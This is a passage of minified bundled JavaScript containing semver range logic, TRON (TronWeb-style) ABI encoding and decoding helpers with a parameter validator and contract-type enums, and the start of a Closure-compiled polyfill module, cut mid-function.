            return this.set.some($ => B($, _) && R.set.some(z => B(z, _) && $.every(K => z.every(j => K.intersects(j, _)))))
        }
        test(R) {
            if (!R)
                return !1;
            if (typeof R == "string")
                try {
                    R = new a(R,this.options)
                } catch {
                    return !1
                }
            for (let _ = 0; _ < this.set.length; _++)
                if (Y(this.set[_], R, this.options))
                    return !0;
            return !1
        }
    }
    _T = e;
    const t = cge()
      , o = new t
      , i = m4()
      , n = hx()
      , s = fx()
      , a = vo()
      , {safeRe: l, t: f, comparatorTrimReplace: h, tildeTrimReplace: p, caretTrimReplace: b} = F0()
      , {FLAG_INCLUDE_PRERELEASE: v, FLAG_LOOSE: T} = ux()
      , x = V => V.value === "<0.0.0-0"
      , E = V => V.value === ""
      , B = (V, R) => {
        let _ = !0;
        const $ = V.slice();
        let z = $.pop();
        for (; _ && $.length; )
            _ = $.every(K => z.intersects(K, R)),
            z = $.pop();
        return _
    }
      , P = (V, R) => (s("comp", V, R),
    V = I(V, R),
    s("caret", V),
    V = F(V, R),
    s("tildes", V),
    V = C(V, R),
    s("xrange", V),
    V = k(V, R),
    s("stars", V),
    V)
      , O = V => !V || V.toLowerCase() === "x" || V === "*"
      , F = (V, R) => V.trim().split(/\s+/).map(_ => D(_, R)).join(" ")
      , D = (V, R) => {
        const _ = R.loose ? l[f.TILDELOOSE] : l[f.TILDE];
        return V.replace(_, ($, z, K, j, ee) => {
            s("tilde", V, $, z, K, j, ee);
            let ie;
            return O(z) ? ie = "" : O(K) ? ie = `>=${z}.0.0 <${+z + 1}.0.0-0` : O(j) ? ie = `>=${z}.${K}.0 <${z}.${+K + 1}.0-0` : ee ? (s("replaceTilde pr", ee),
            ie = `>=${z}.${K}.${j}-${ee} <${z}.${+K + 1}.0-0`) : ie = `>=${z}.${K}.${j} <${z}.${+K + 1}.0-0`,
            s("tilde return", ie),
            ie
        }
        )
    }
      , I = (V, R) => V.trim().split(/\s+/).map(_ => M(_, R)).join(" ")
      , M = (V, R) => {
        s("caret", V, R);
        const _ = R.loose ? l[f.CARETLOOSE] : l[f.CARET]
          , $ = R.includePrerelease ? "-0" : "";
        return V.replace(_, (z, K, j, ee, ie) => {
            s("caret", V, z, K, j, ee, ie);
            let ae;
            return O(K) ? ae = "" : O(j) ? ae = `>=${K}.0.0${$} <${+K + 1}.0.0-0` : O(ee) ? K === "0" ? ae = `>=${K}.${j}.0${$} <${K}.${+j + 1}.0-0` : ae = `>=${K}.${j}.0${$} <${+K + 1}.0.0-0` : ie ? (s("replaceCaret pr", ie),
            K === "0" ? j === "0" ? ae = `>=${K}.${j}.${ee}-${ie} <${K}.${j}.${+ee + 1}-0` : ae = `>=${K}.${j}.${ee}-${ie} <${K}.${+j + 1}.0-0` : ae = `>=${K}.${j}.${ee}-${ie} <${+K + 1}.0.0-0`) : (s("no pr"),
            K === "0" ? j === "0" ? ae = `>=${K}.${j}.${ee}${$} <${K}.${j}.${+ee + 1}-0` : ae = `>=${K}.${j}.${ee}${$} <${K}.${+j + 1}.0-0` : ae = `>=${K}.${j}.${ee} <${+K + 1}.0.0-0`),
            s("caret return", ae),
            ae
        }
        )
    }
      , C = (V, R) => (s("replaceXRanges", V, R),
    V.split(/\s+/).map(_ => W(_, R)).join(" "))
      , W = (V, R) => {
        V = V.trim();
        const _ = R.loose ? l[f.XRANGELOOSE] : l[f.XRANGE];
        return V.replace(_, ($, z, K, j, ee, ie) => {
            s("xRange", V, $, z, K, j, ee, ie);
            const ae = O(K)
              , he = ae || O(j)
              , me = he || O(ee)
              , Pe = me;
            return z === "=" && Pe && (z = ""),
            ie = R.includePrerelease ? "-0" : "",
            ae ? z === ">" || z === "<" ? $ = "<0.0.0-0" : $ = "*" : z && Pe ? (he && (j = 0),
            ee = 0,
            z === ">" ? (z = ">=",
            he ? (K = +K + 1,
            j = 0,
            ee = 0) : (j = +j + 1,
            ee = 0)) : z === "<=" && (z = "<",
            he ? K = +K + 1 : j = +j + 1),
            z === "<" && (ie = "-0"),
            $ = `${z + K}.${j}.${ee}${ie}`) : he ? $ = `>=${K}.0.0${ie} <${+K + 1}.0.0-0` : me && ($ = `>=${K}.${j}.0${ie} <${K}.${+j + 1}.0-0`),
            s("xRange return", $),
            $
        }
        )
    }
      , k = (V, R) => (s("replaceStars", V, R),
    V.trim().replace(l[f.STAR], ""))
      , H = (V, R) => (s("replaceGTE0", V, R),
    V.trim().replace(l[R.includePrerelease ? f.GTE0PRE : f.GTE0], ""))
      , X = V => (R, _, $, z, K, j, ee, ie, ae, he, me, Pe) => (O($) ? _ = "" : O(z) ? _ = `>=${$}.0.0${V ? "-0" : ""}` : O(K) ? _ = `>=${$}.${z}.0${V ? "-0" : ""}` : j ? _ = `>=${_}` : _ = `>=${_}${V ? "-0" : ""}`,
    O(ae) ? ie = "" : O(he) ? ie = `<${+ae + 1}.0.0-0` : O(me) ? ie = `<${ae}.${+he + 1}.0-0` : Pe ? ie = `<=${ae}.${he}.${me}-${Pe}` : V ? ie = `<${ae}.${he}.${+me + 1}-0` : ie = `<=${ie}`,
    `${_} ${ie}`.trim())
      , Y = (V, R, _) => {
        for (let $ = 0; $ < V.length; $++)
            if (!V[$].test(R))
                return !1;
        if (R.prerelease.length && !_.includePrerelease) {
            for (let $ = 0; $ < V.length; $++)
                if (s(V[$].semver),
                V[$].semver !== n.ANY && V[$].semver.prerelease.length > 0) {
                    const z = V[$].semver;
                    if (z.major === R.major && z.minor === R.minor && z.patch === R.patch)
                        return !0
                }
            return !1
        }
        return !0
    }
    ;
    return _T
}
var IT, G5;
function hx() {
    if (G5)
        return IT;
    G5 = 1;
    const r = Symbol("SemVer ANY");
    class e {
        static get ANY() {
            return r
        }
        constructor(h, p) {
            if (p = t(p),
            h instanceof e) {
                if (h.loose === !!p.loose)
                    return h;
                h = h.value
            }
            h = h.trim().split(/\s+/).join(" "),
            s("comparator", h, p),
            this.options = p,
            this.loose = !!p.loose,
            this.parse(h),
            this.semver === r ? this.value = "" : this.value = this.operator + this.semver.version,
            s("comp", this)
        }
        parse(h) {
            const p = this.options.loose ? o[i.COMPARATORLOOSE] : o[i.COMPARATOR]
              , b = h.match(p);
            if (!b)
                throw new TypeError(`Invalid comparator: ${h}`);
            this.operator = b[1] !== void 0 ? b[1] : "",
            this.operator === "=" && (this.operator = ""),
            b[2] ? this.semver = new a(b[2],this.options.loose) : this.semver = r
        }
        toString() {
            return this.value
        }
        test(h) {
            if (s("Comparator.test", h, this.options.loose),
            this.semver === r || h === r)
                return !0;
            if (typeof h == "string")
                try {
                    h = new a(h,this.options)
                } catch {
                    return !1
                }
            return n(h, this.operator, this.semver, this.options)
        }
        intersects(h, p) {
            if (!(h instanceof e))
                throw new TypeError("a Comparator is required");
            return this.operator === "" ? this.value === "" ? !0 : new l(h.value,p).test(this.value) : h.operator === "" ? h.value === "" ? !0 : new l(this.value,p).test(h.semver) : (p = t(p),
            p.includePrerelease && (this.value === "<0.0.0-0" || h.value === "<0.0.0-0") || !p.includePrerelease && (this.value.startsWith("<0.0.0") || h.value.startsWith("<0.0.0")) ? !1 : !!(this.operator.startsWith(">") && h.operator.startsWith(">") || this.operator.startsWith("<") && h.operator.startsWith("<") || this.semver.version === h.semver.version && this.operator.includes("=") && h.operator.includes("=") || n(this.semver, "<", h.semver, p) && this.operator.startsWith(">") && h.operator.startsWith("<") || n(this.semver, ">", h.semver, p) && this.operator.startsWith("<") && h.operator.startsWith(">")))
        }
    }
    IT = e;
    const t = m4()
      , {safeRe: o, t: i} = F0()
      , n = mU()
      , s = fx()
      , a = vo()
      , l = gs();
    return IT
}
var OT, K5;
function px() {
    if (K5)
        return OT;
    K5 = 1;
    const r = gs();
    return OT = (t, o, i) => {
        try {
            o = new r(o,i)
        } catch {
            return !1
        }
        return o.test(t)
    }
    ,
    OT
}
var RT, Z5;
function lge() {
    if (Z5)
        return RT;
    Z5 = 1;
    const r = gs();
    return RT = (t, o) => new r(t,o).set.map(i => i.map(n => n.value).join(" ").trim().split(" ")),
    RT
}
var WT, Y5;
function uge() {
    if (Y5)
        return WT;
    Y5 = 1;
    const r = vo()
      , e = gs();
    return WT = (o, i, n) => {
        let s = null
          , a = null
          , l = null;
        try {
            l = new e(i,n)
        } catch {
            return null
        }
        return o.forEach(f => {
            l.test(f) && (!s || a.compare(f) === -1) && (s = f,
            a = new r(s,n))
        }
        ),
        s
    }
    ,
    WT
}
var MT, X5;
function fge() {
    if (X5)
        return MT;
    X5 = 1;
    const r = vo()
      , e = gs();
    return MT = (o, i, n) => {
        let s = null
          , a = null
          , l = null;
        try {
            l = new e(i,n)
        } catch {
            return null
        }
        return o.forEach(f => {
            l.test(f) && (!s || a.compare(f) === 1) && (s = f,
            a = new r(s,n))
        }
        ),
        s
    }
    ,
    MT
}
var NT, J5;
function dge() {
    if (J5)
        return NT;
    J5 = 1;
    const r = vo()
      , e = gs()
      , t = dx();
    return NT = (i, n) => {
        i = new e(i,n);
        let s = new r("0.0.0");
        if (i.test(s) || (s = new r("0.0.0-0"),
        i.test(s)))
            return s;
        s = null;
        for (let a = 0; a < i.set.length; ++a) {
            const l = i.set[a];
            let f = null;
            l.forEach(h => {
                const p = new r(h.semver.version);
                switch (h.operator) {
                case ">":
                    p.prerelease.length === 0 ? p.patch++ : p.prerelease.push(0),
                    p.raw = p.format();
                case "":
                case ">=":
                    (!f || t(p, f)) && (f = p);
                    break;
                case "<":
                case "<=":
                    break;
                default:
                    throw new Error(`Unexpected operation: ${h.operator}`)
                }
            }
            ),
            f && (!s || t(s, f)) && (s = f)
        }
        return s && i.test(s) ? s : null
    }
    ,
    NT
}
var DT, Q5;
function hge() {
    if (Q5)
        return DT;
    Q5 = 1;
    const r = gs();
    return DT = (t, o) => {
        try {
            return new r(t,o).range || "*"
        } catch {
            return null
        }
    }
    ,
    DT
}
var FT, eW;
function E4() {
    if (eW)
        return FT;
    eW = 1;
    const r = vo()
      , e = hx()
      , {ANY: t} = e
      , o = gs()
      , i = px()
      , n = dx()
      , s = w4()
      , a = T4()
      , l = v4();
    return FT = (h, p, b, v) => {
        h = new r(h,v),
        p = new o(p,v);
        let T, x, E, B, P;
        switch (b) {
        case ">":
            T = n,
            x = a,
            E = s,
            B = ">",
            P = ">=";
            break;
        case "<":
            T = s,
            x = l,
            E = n,
            B = "<",
            P = "<=";
            break;
        default:
            throw new TypeError('Must provide a hilo val of "<" or ">"')
        }
        if (i(h, p, v))
            return !1;
        for (let O = 0; O < p.set.length; ++O) {
            const F = p.set[O];
            let D = null
              , I = null;
            if (F.forEach(M => {
                M.semver === t && (M = new e(">=0.0.0")),
                D = D || M,
                I = I || M,
                T(M.semver, D.semver, v) ? D = M : E(M.semver, I.semver, v) && (I = M)
            }
            ),
            D.operator === B || D.operator === P || (!I.operator || I.operator === B) && x(h, I.semver))
                return !1;
            if (I.operator === P && E(h, I.semver))
                return !1
        }
        return !0
    }
    ,
    FT
}
var UT, tW;
function pge() {
    if (tW)
        return UT;
    tW = 1;
    const r = E4();
    return UT = (t, o, i) => r(t, o, ">", i),
    UT
}
var kT, rW;
function gge() {
    if (rW)
        return kT;
    rW = 1;
    const r = E4();
    return kT = (t, o, i) => r(t, o, "<", i),
    kT
}
var LT, nW;
function yge() {
    if (nW)
        return LT;
    nW = 1;
    const r = gs();
    return LT = (t, o, i) => (t = new r(t,i),
    o = new r(o,i),
    t.intersects(o, i)),
    LT
}
var $T, oW;
function bge() {
    if (oW)
        return $T;
    oW = 1;
    const r = px()
      , e = ps();
    return $T = (t, o, i) => {
        const n = [];
        let s = null
          , a = null;
        const l = t.sort( (b, v) => e(b, v, i));
        for (const b of l)
            r(b, o, i) ? (a = b,
            s || (s = b)) : (a && n.push([s, a]),
            a = null,
            s = null);
        s && n.push([s, null]);
        const f = [];
        for (const [b,v] of n)
            b === v ? f.push(b) : !v && b === l[0] ? f.push("*") : v ? b === l[0] ? f.push(`<=${v}`) : f.push(`${b} - ${v}`) : f.push(`>=${b}`);
        const h = f.join(" || ")
          , p = typeof o.raw == "string" ? o.raw : String(o);
        return h.length < p.length ? h : o
    }
    ,
    $T
}
var zT, iW;
function mge() {
    if (iW)
        return zT;
    iW = 1;
    const r = gs()
      , e = hx()
      , {ANY: t} = e
      , o = px()
      , i = ps()
      , n = (p, b, v={}) => {
        if (p === b)
            return !0;
        p = new r(p,v),
        b = new r(b,v);
        let T = !1;
        e: for (const x of p.set) {
            for (const E of b.set) {
                const B = l(x, E, v);
                if (T = T || B !== null,
                B)
                    continue e
            }
            if (T)
                return !1
        }
        return !0
    }
      , s = [new e(">=0.0.0-0")]
      , a = [new e(">=0.0.0")]
      , l = (p, b, v) => {
        if (p === b)
            return !0;
        if (p.length === 1 && p[0].semver === t) {
            if (b.length === 1 && b[0].semver === t)
                return !0;
            v.includePrerelease ? p = s : p = a
        }
        if (b.length === 1 && b[0].semver === t) {
            if (v.includePrerelease)
                return !0;
            b = a
        }
        const T = new Set;
        let x, E;
        for (const C of p)
            C.operator === ">" || C.operator === ">=" ? x = f(x, C, v) : C.operator === "<" || C.operator === "<=" ? E = h(E, C, v) : T.add(C.semver);
        if (T.size > 1)
            return null;
        let B;
        if (x && E) {
            if (B = i(x.semver, E.semver, v),
            B > 0)
                return null;
            if (B === 0 && (x.operator !== ">=" || E.operator !== "<="))
                return null
        }
        for (const C of T) {
            if (x && !o(C, String(x), v) || E && !o(C, String(E), v))
                return null;
            for (const W of b)
                if (!o(C, String(W), v))
                    return !1;
            return !0
        }
        let P, O, F, D, I = E && !v.includePrerelease && E.semver.prerelease.length ? E.semver : !1, M = x && !v.includePrerelease && x.semver.prerelease.length ? x.semver : !1;
        I && I.prerelease.length === 1 && E.operator === "<" && I.prerelease[0] === 0 && (I = !1);
        for (const C of b) {
            if (D = D || C.operator === ">" || C.operator === ">=",
            F = F || C.operator === "<" || C.operator === "<=",
            x) {
                if (M && C.semver.prerelease && C.semver.prerelease.length && C.semver.major === M.major && C.semver.minor === M.minor && C.semver.patch === M.patch && (M = !1),
                C.operator === ">" || C.operator === ">=") {
                    if (P = f(x, C, v),
                    P === C && P !== x)
                        return !1
                } else if (x.operator === ">=" && !o(x.semver, String(C), v))
                    return !1
            }
            if (E) {
                if (I && C.semver.prerelease && C.semver.prerelease.length && C.semver.major === I.major && C.semver.minor === I.minor && C.semver.patch === I.patch && (I = !1),
                C.operator === "<" || C.operator === "<=") {
                    if (O = h(E, C, v),
                    O === C && O !== E)
                        return !1
                } else if (E.operator === "<=" && !o(E.semver, String(C), v))
                    return !1
            }
            if (!C.operator && (E || x) && B !== 0)
                return !1
        }
        return !(x && F && !E && B !== 0 || E && D && !x && B !== 0 || M || I)
    }
      , f = (p, b, v) => {
        if (!p)
            return b;
        const T = i(p.semver, b.semver, v);
        return T > 0 ? p : T < 0 || b.operator === ">" && p.operator === ">=" ? b : p
    }
      , h = (p, b, v) => {
        if (!p)
            return b;
        const T = i(p.semver, b.semver, v);
        return T < 0 ? p : T > 0 || b.operator === "<" && p.operator === "<=" ? b : p
    }
    ;
    return zT = n,
    zT
}
var jT, sW;
function xge() {
    if (sW)
        return jT;
    sW = 1;
    const r = F0()
      , e = ux()
      , t = vo()
      , o = gU()
      , i = ih()
      , n = Z0e()
      , s = Y0e()
      , a = X0e()
      , l = J0e()
      , f = Q0e()
      , h = ege()
      , p = tge()
      , b = rge()
      , v = ps()
      , T = nge()
      , x = oge()
      , E = x4()
      , B = ige()
      , P = sge()
      , O = dx()
      , F = w4()
      , D = yU()
      , I = bU()
      , M = v4()
      , C = T4()
      , W = mU()
      , k = age()
      , H = hx()
      , X = gs()
      , Y = px()
      , V = lge()
      , R = uge()
      , _ = fge()
      , $ = dge()
      , z = hge()
      , K = E4()
      , j = pge()
      , ee = gge()
      , ie = yge()
      , ae = bge()
      , he = mge();
    return jT = {
        parse: i,
        valid: n,
        clean: s,
        inc: a,
        diff: l,
        major: f,
        minor: h,
        patch: p,
        prerelease: b,
        compare: v,
        rcompare: T,
        compareLoose: x,
        compareBuild: E,
        sort: B,
        rsort: P,
        gt: O,
        lt: F,
        eq: D,
        neq: I,
        gte: M,
        lte: C,
        cmp: W,
        coerce: k,
        Comparator: H,
        Range: X,
        satisfies: Y,
        toComparators: V,
        maxSatisfying: R,
        minSatisfying: _,
        minVersion: $,
        validRange: z,
        outside: K,
        gtr: j,
        ltr: ee,
        intersects: ie,
        simplifyRange: ae,
        subset: he,
        SemVer: t,
        re: r.re,
        src: r.src,
        tokens: r.t,
        SEMVER_SPEC_VERSION: e.SEMVER_SPEC_VERSION,
        RELEASE_TYPES: e.RELEASE_TYPES,
        compareIdentifiers: o.compareIdentifiers,
        rcompareIdentifiers: o.rcompareIdentifiers
    },
    jT
}
var wge = xge();
const xU = Zc(wge)
  , gx = new Hc;
function aW(r) {
    return or.address.toHex(r).replace(Ld, "0x")
}
function vge(r, e, t, o=!1) {
    if (o && t.replace(/^0x/, "").length % 64 === 8 && (t = "0x" + t.replace(/^0x/, "").substring(8)),
    t.replace(/^0x/, "").length % 64)
        throw new Error("The encoded string is not valid. Its length must be a multiple of 64.");
    return e = e.map(i => (/trcToken/.test(i) && (i = i.replace(/trcToken/, "uint256")),
    i)),
    gx.decode(e, t).reduce( (i, n, s) => (e[s] == "address" && (n = $i + n.substr(2).toLowerCase()),
    r.length ? i[r[s]] = n : i.push(n),
    i), r.length ? {} : [])
}
function Tge(r, e) {
    for (let t = 0; t < r.length; t++)
        r[t] === "address" && (e[t] = or.address.toHex(e[t]).replace(Ld, "0x"));
    return gx.encode(r, e)
}
function t0(r) {
    const e = r.match(/([a-zA-Z0-9])(\[.*\])/);
    return e ? e[2] : ""
}
function wU(r) {
    return (t0(r).match(/\]\[/g) || []).length + 1
}
function g1(r, e) {
    const t = []
      , o = l => l && l.type.indexOf("tuple") === 0 && l.components ? `tuple(${l.components.map(h => o(h)).join(",")})${t0(l.type)}` : /trcToken/.test(l.type) ? l.type.replace(/trcToken/, "uint256") : l.type
      , i = l => {
        for (let f = 0; f < l.length; f++) {
            const h = l[f];
            /trcToken/.test(h) && (l[f] = h.replace(/trcToken/, "uint256"))
        }
    }
      , n = l => Array.isArray(l) ? (l.forEach( (f, h) => {
        l[h] = n(f)
    }
    ),
    l) : aW(l)
      , s = (l, f, h) => {
        h > 1 ? f.length && f.forEach(p => {
            s(l, p, h - 1)
        }
        ) : f.length && h && f.forEach(p => {
            a(l, p)
        }
        )
    }
      , a = (l=[], f) => {
        l.length && l.forEach( (h, p) => {
            const b = h.type;
            if (f[p]) {
                if (b === "address")
                    f[p] = aW(f[p]);
                else if (b.match(/^([^\x5b]*)(\x5b|$)/)[0] === "address[")
                    n(f[p]);
                else if (b.indexOf("tuple") === 0)
                    if (t0(b)) {
                        const v = wU(b);
                        s(h.components, f[p], v)
                    } else
                        a(h.components, f[p])
            }
        }
        )
    }
    ;
    if (r.inputs && r.inputs.length)
        for (let l = 0; l < r.inputs.length; l++) {
            const f = r.inputs[l].type;
            f === "bool" && e[l] === "false" && (e[l] = !1),
            t.push(f.indexOf("tuple") === 0 ? o(r.inputs[l]) : f),
            e.length < t.length && e.push("")
        }
    return a(r.inputs, e),
    i(t),
    gx.encode(t, e)
}
function vU(r, e) {
    const t = a => {
        for (let l = 0; l < a.length; l++) {
            const f = a[l];
            /^trcToken/.test(f) && (a[l] = f.replace(/^trcToken/, "uint256"))
        }
    }
      , o = a => Array.isArray(a) ? (a.forEach( (l, f) => {
        a[f] = o(l)
    }
    ),
    a) : or.address.toHex(a)
      , i = (a, l, f) => {
        f > 1 ? l.length && l.forEach(h => {
            i(a, h, f - 1)
        }
        ) : l.length && f && l.forEach(h => {
            s(a, h)
        }
        )
    }
      , n = a => {
        const l = a.name ? ` ${a.name}` : "";
        return a && a.type.indexOf("tuple") === 0 && a.components ? `tuple(${a.components.map(h => n(h)).join(",")})${t0(a.type)}${l}` : /trcToken/.test(a.type) ? a.type.replace(/trcToken/, "uint256") + l : a.type + l
    }
      , s = (a, l) => {
        a.length && a.forEach( (f, h) => {
            const {type: p, name: b} = f;
            if (l[h])
                if (p === "address")
                    l[h] = or.address.toHex(l[h]),
                    b && (l[b] = or.address.toHex(l[h]));
                else if (p.match(/^([^\x5b]*)(\x5b|$)/)[0] === "address[")
                    o(l[h]),
                    b && (l[b] = o(l[h]));
                else if (p.indexOf("tuple") === 0) {
                    if (t0(p)) {
                        const v = wU(p);
                        i(f.components, l[h], v)
                    } else
                        s(f.components, l[h]);
                    b && (l[b] = l[h])
                } else
                    b && (l[b] = l[h]);
            else
                b && (l[b] = l[h])
        }
        )
    }
    ;
    if ("outputs"in r && r.outputs && r.outputs.length > 0) {
        const a = [];
        for (let h = 0; h < r.outputs.length; h++) {
            const p = r.outputs[h].type
              , b = r.outputs[h].name ? ` ${r.outputs[h].name}` : "";
            a.push(p.indexOf("tuple") === 0 ? n(r.outputs[h]) : p + b)
        }
        t(a),
        (!e || !e.length) && (e = new Uint8Array(32 * r.outputs.length));
        const f = gx.decode(a, e).toArray(!0);
        return s(r.outputs, f),
        f
    }
    return []
}
const Ege = Object.freeze(Object.defineProperty({
    __proto__: null,
    decodeParams: vge,
    decodeParamsV2ByABI: vU,
    encodeParams: Tge,
    encodeParamsV2ByABI: g1
}, Symbol.toStringTag, {
    value: "Module"
}));
class TU {
    invalid(e) {
        return e.msg || `Invalid ${e.name}${e.type === "address" ? " address" : ""} provided`
    }
    notPositive(e) {
        return `${e.name} must be a positive integer`
    }
    notEqual(e) {
        var t, o;
        return e.msg || `${(t = e.names) == null ? void 0 : t[0]} can not be equal to ${(o = e.names) == null ? void 0 : o[1]}`
    }
    notValid(e) {
        const t = {};
        let o = !1;
        for (const i of e) {
            const {name: n, names: s, value: a, type: l, gt: f, lt: h, gte: p, lte: b, optional: v} = i;
            if (!(v && (!co(a) || l !== "boolean" && a === !1))) {
                switch (t[n] = i.value,
                l) {
                case "address":
                    M0(a) ? t[n] = gt(a) : o = !0;
                    break;
                case "integer":
                    (!Dc(a) || typeof f == "number" && a <= f || typeof h == "number" && a >= h || typeof p == "number" && a < p || typeof b == "number" && a > b) && (o = !0);
                    break;
                case "positive-integer":
                    if (!Dc(a) || a <= 0)
                        throw new Error(this.notPositive(i));
                    break;
                case "tokenId":
                    (!fo(a) || !a.length) && (o = !0);
                    break;
                case "notEmptyObject":
                    (!B0(a) || !Object.keys(a).length) && (o = !0);
                    break;
                case "notEqual":
                    if (s && t[s[0]] === t[s[1]])
                        throw new Error(this.notEqual(i));
                    break;
                case "resource":
                    ["BANDWIDTH", "ENERGY"].includes(a) || (o = !0);
                    break;
                case "url":
                    G3(a) || (o = !0);
                    break;
                case "hex":
                    Ou(a) || (o = !0);
                    break;
                case "array":
                    Array.isArray(a) || (o = !0);
                    break;
                case "not-empty-string":
                    (!fo(a) || !a.length) && (o = !0);
                    break;
                case "boolean":
                    GD(a) || (o = !0);
                    break;
                case "string":
                    (!fo(a) || typeof f == "number" && a.length <= f || typeof h == "number" && a.length >= h || typeof p == "number" && a.length < p || typeof b == "number" && a.length > b) && (o = !0);
                    break
                }
                if (o)
                    throw new Error(this.invalid(i))
            }
        }
        return !1
    }
}
var nr;
(function(r) {
    r.AccountCreateContract = "AccountCreateContract",
    r.TransferContract = "TransferContract",
    r.TransferAssetContract = "TransferAssetContract",
    r.VoteAssetContract = "VoteAssetContract",
    r.VoteWitnessContract = "VoteWitnessContract",
    r.WitnessCreateContract = "WitnessCreateContract",
    r.AssetIssueContract = "AssetIssueContract",
    r.WitnessUpdateContract = "WitnessUpdateContract",
    r.ParticipateAssetIssueContract = "ParticipateAssetIssueContract",
    r.AccountUpdateContract = "AccountUpdateContract",
    r.FreezeBalanceContract = "FreezeBalanceContract",
    r.UnfreezeBalanceContract = "UnfreezeBalanceContract",
    r.CancelAllUnfreezeV2Contract = "CancelAllUnfreezeV2Contract",
    r.WithdrawBalanceContract = "WithdrawBalanceContract",
    r.UnfreezeAssetContract = "UnfreezeAssetContract",
    r.UpdateAssetContract = "UpdateAssetContract",
    r.ProposalCreateContract = "ProposalCreateContract",
    r.ProposalApproveContract = "ProposalApproveContract",
    r.ProposalDeleteContract = "ProposalDeleteContract",
    r.SetAccountIdContract = "SetAccountIdContract",
    r.CustomContract = "CustomContract",
    r.CreateSmartContract = "CreateSmartContract",
    r.TriggerSmartContract = "TriggerSmartContract",
    r.GetContract = "GetContract",
    r.UpdateSettingContract = "UpdateSettingContract",
    r.ExchangeCreateContract = "ExchangeCreateContract",
    r.ExchangeInjectContract = "ExchangeInjectContract",
    r.ExchangeWithdrawContract = "ExchangeWithdrawContract",
    r.ExchangeTransactionContract = "ExchangeTransactionContract",
    r.UpdateEnergyLimitContract = "UpdateEnergyLimitContract",
    r.AccountPermissionUpdateContract = "AccountPermissionUpdateContract",
    r.ClearABIContract = "ClearABIContract",
    r.UpdateBrokerageContract = "UpdateBrokerageContract",
    r.ShieldedTransferContract = "ShieldedTransferContract",
    r.MarketSellAssetContract = "MarketSellAssetContract",
    r.MarketCancelOrderContract = "MarketCancelOrderContract",
    r.FreezeBalanceV2Contract = "FreezeBalanceV2Contract",
    r.UnfreezeBalanceV2Contract = "UnfreezeBalanceV2Contract",
    r.WithdrawExpireUnfreezeContract = "WithdrawExpireUnfreezeContract",
    r.DelegateResourceContract = "DelegateResourceContract",
    r.UnDelegateResourceContract = "UnDelegateResourceContract",
    r.UNRECOGNIZED = "UNRECOGNIZED"
}
)(nr || (nr = {}));
var cW;
(function(r) {
    r[r.Owner = 0] = "Owner",
    r[r.Witness = 1] = "Witness",
    r[r.Active = 2] = "Active",
    r[r.UNRECOGNIZED = -1] = "UNRECOGNIZED"
}
)(cW || (cW = {}));
var lW;
(function(r) {
    r[r.Normal = 0] = "Normal",
    r[r.AssetIssue = 1] = "AssetIssue",
    r[r.Contract = 2] = "Contract",
    r[r.UNRECOGNIZED = -1] = "UNRECOGNIZED"
}
)(lW || (lW = {}));
var qT = {}, _l = {}, uW;
function ys() {
    return uW || (uW = 1,
    function(r) {
        var e = typeof Object.defineProperties == "function" ? Object.defineProperty : function(y, m, S) {
            y != Array.prototype && y != Object.prototype && (y[m] = S.value)
        }
          , t = typeof window < "u" && window === _l ? _l : typeof Ba < "u" && Ba != null ? Ba : _l;
        function o(y, m) {
            if (m) {
                var S = t;
                y = y.split(".");
                for (var G = 0; G < y.length - 1; G++) {
                    var oe = y[G];
                    oe in S || (S[oe] = {}),
                    S = S[oe]
                }
                y = y[y.length - 1],
                G = S[y],
                m = m(G),
                m != G && m != null && e(S, y, {
                    configurable: !0,
                    writable: !0,
                    value: m
                })
            }
        }
        function i(y) {
            var m = 0;
            return function() {
                return m < y.length ? {
                    done: !1,
                    value: y[m++]
                } : {
                    done: !0
                }
            }
        }
        function n() {
            n = function() {}
            ,
            t.Symbol || (t.Symbol = a)
        }
        function s(y, m) {
            this.a = y,
            e(this, "description", {
                configurable: !0,
                writable: !0,
                value: m
            })
        }
        s.prototype.toString = function() {
            return this.a
        }
        ;
        var a = function() {
            function y(S) {
                if (this instanceof y)
                    throw new TypeError("Symbol is not a constructor");
                return new s("jscomp_symbol_" + (S || "") + "_" + m++,S)
            }
            var m = 0;
            return y
        }();
        function l() {
            n();
            var y = t.Symbol.iterator;
            y || (y = t.Symbol.iterator = t.Symbol("Symbol.iterator")),
            typeof Array.prototype[y] != "function" && e(Array.prototype, y, {
                configurable: !0,
                writable: !0,
                value: function() {
                    return f(i(this))
                }
            }),
            l = function() {}
        }
        function f(y) {
            return l(),
            y = {
                next: y
            },
            y[t.Symbol.iterator] = function() {
                return this
            }
            ,
            y
        }
        function h(y, m) {
            l(),
            y instanceof String && (y += "");
            var S = 0
              , G = {
                next: function() {
                    if (S < y.length) {
                        var oe = S++;
                        return {
                            value: m(oe, y[oe]),
                            done: !1
                        }
                    }
                    return G.next = function() {
                        return {
                            done: !0,
                            value: void 0
                        }
                    }
                    ,
                    G.next()
                }
            };
            return G[Symbol.iterator] = function() {
                return G
            }
            ,
            G
        }
        o("Array.prototype.entries", function(y) {
            return y || function() {
                return h(this, function(m, S) {
                    return [m, S]
                })
            }
        });
        var p = _l || self;
        function b(y, m, S) {
            y = y.split("."),
            S = S || p,
            y[0]in S || typeof S.execScript > "u" || S.execScript("var " + y[0]);
            for (var G; y.length && (G = y.shift()); )
                y.length || m === void 0 ? S[G] && S[G] !== Object.prototype[G] ? S = S[G] : S = S[G] = {} : S[G] = m
        }
        function v(y) {
            var m = typeof y;
            if (m == "object")
                if (y) {
                    if (y instanceof Array)
                        return "array";
                    if (y instanceof Object)
                        return m;
                    var S = Object.prototype.toString.call(y);
                    if (S == "[object Window]")
                        return "object";
                    if (S == "[object Array]" || typeof y.length == "number" && typeof y.splice < "u" && typeof y.propertyIsEnumerable < "u" && !y.propertyIsEnumerable("splice"))
                        return "array";
                    if (S == "[object Function]" || typeof y.call < "u" && typeof y.propertyIsEnumerable < "u" && !y.propertyIsEnumerable("call"))
                        return "function"
                } else
                    return "null";
            else if (m == "function" && typeof y.call > "u")
                return "object";
            return m
        }
        function T(y) {
            var m = typeof y;
            return m == "object" && y != null || m == "function"
        }
        function x(y, m, S) {
            b(y, m, S)
        }
        function E(y, m) {
            function S() {}
            S.prototype = m.prototype,
            y.prototype = new S,
            y.prototype.constructor = y
        }
        var B = "constructor hasOwnProperty isPrototypeOf propertyIsEnumerable toLocaleString toString valueOf".split(" ");
        function P(y, m) {
            for (var S, G, oe = 1; oe < arguments.length; oe++) {
                G = arguments[oe];
                for (S in G)
                    y[S] = G[S];
                for (var be = 0; be < B.length; be++)
                    S = B[be],
                    Object.prototype.hasOwnProperty.call(G, S) && (y[S] = G[S])
            }
        }
        var O = Array.prototype.forEach ? function(y, m) {
